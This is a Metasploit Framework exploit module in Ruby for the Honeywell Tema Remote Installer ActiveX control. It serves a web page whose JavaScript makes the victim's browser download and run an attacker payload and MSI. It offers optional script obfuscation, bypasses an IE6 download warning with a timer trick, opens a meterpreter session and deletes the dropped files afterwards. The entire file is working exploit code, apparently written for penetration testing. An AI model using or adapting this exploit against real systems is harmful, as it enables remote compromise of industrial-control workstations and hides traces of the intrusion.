##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Honeywell Tema Remote Installer ActiveX Remote Code Execution",
			'Description'    => %q{
					This modules exploits a vulnerability found in the Honewell Tema ActiveX Remote
				Installer.  This ActiveX control can be abused by using the DownloadFromURL()
				function to install an arbitrary MSI from a remote location without checking source
				authenticity or user notification. This module has been tested successfully with
				the Remote Installer ActiveX installed with HoneyWell EBI R410.1 - TEMA 5.3.0 and
				Internet Explorer 6, 7 and 8 on Windows XP SP3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Billy Rios', # Vulnerability discovery
					'Terry McCorkle', # Vulnerability discovery
					'juan vazquez'  # Metasploit
				],
			'References'     =>
				[
					[ 'OSVDB', '76681' ],
					[ 'BID', '50078' ],
					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICSA-11-285-01.pdf' ]
				],
			'Payload'        =>
				{
					'Space'    => 2048,
					'StackAdjustment' => -3500
				},
			'DefaultOptions'  =>
				{
					'EXITFUNC'         => "none",
					'InitialAutoRunScript' => 'migrate -k -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# HoneyWell EBI R410.1 - TEMA 5.3.0
					# Tema_RemoteInstaller.ocx 1.0.0.0
					[ 'Automatic', {} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Oct 20 2011",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)
	end

	def exploit
		@dropped_files = [
			'payload.exe',
			'ThinClient_TemaKit.msi',
			'ThinClient_TemaKit.log'
		]
		super
	end

	def on_new_session(session)
		if session.type == "meterpreter"
			session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
		end

		@dropped_files.each do |file|
			win_file = file.gsub("/", "\\\\")
			if session.type == "meterpreter"
				begin
					wintemp = session.fs.file.expand_path("%WINDIR%")
					win_file = "#{wintemp}\\Temp\\#{win_file}"
					# Meterpreter should do this automatically as part of
					# fs.file.rm().  Until that has been implemented, remove the
					# read-only flag with a command.
					session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
					session.fs.file.rm(win_file)
					print_good("Deleted #{file}")
					true
				rescue ::Rex::Post::Meterpreter::RequestError
					print_error("Failed to delete #{win_file}")
					false
				end

			end
		end

	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']

		# Windows 7 isn't normally supported because the user won't have write access to the
		# %WINDIR%/Temp directory, where the downloaded components are stored.
		if not (agent =~ /MSIE \d/ and agent =~ /NT 5\.1/) and agent !~ /Tema_RemoteInstaller/
			print_error("Browser not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		# exec_payload.msi needs it to be named payload.exe
		# atm there isn't msi generation on the fly
		if request.uri =~ /payload\.exe$/
			return if ((p=regenerate_payload(cli))==nil)
			data = generate_payload_exe({:code=>p.encoded})
			print_status("Sending payload")
			send_response(cli, data, {'Content-Type'=>'application/octet-stream'})
			return
		end

		if request.uri =~ /\.msi$/
			msi_source = ::File.join(Msf::Config.install_root, "data", "exploits", "exec_payload.msi")
			source = ::File.open(msi_source, "rb"){|fd| fd.read(fd.stat.size) }
			print_status("Sending msi")
			send_response(cli, source, {'Content-Type'=>'application/octet-stream'})
			return
		end

		if agent =~ /MSIE 6/
			# The 'setTimeout' trick allows to execute the installer on IE6 even if the user
			# doesn't click the warning popup when downloading the payload.
			# The ThinClient_TemaKit.msi installer name must be static.
			# <object id="obj" classid="clsid:E01DF79C-BE0C-4999-9B13-B5F7B2306E9B">
			js = <<-EOS
			var obj = new ActiveXObject('Tema_RemoteInstaller.RemoteInstaller');
			setTimeout("obj.DownloadFromURL('#{get_uri}/ThinClient_TemaKit.msi');", 1000);
			obj.DownloadFromURL('#{get_uri}/payload.exe');
			EOS
		else
			js = <<-EOS
			var obj = new ActiveXObject('Tema_RemoteInstaller.RemoteInstaller');
			obj.DownloadFromURL('#{get_uri}/payload.exe');
			obj.DownloadFromURL('#{get_uri}/ThinClient_TemaKit.msi');
			EOS
		end

		js.gsub!(/\t\t\t/, "")

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		html = <<-EOS
		<html>
		<body>
		</object>
		<script>
		#{js}
		</script>
		</body>
		</html>
		EOS

		print_status("Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end
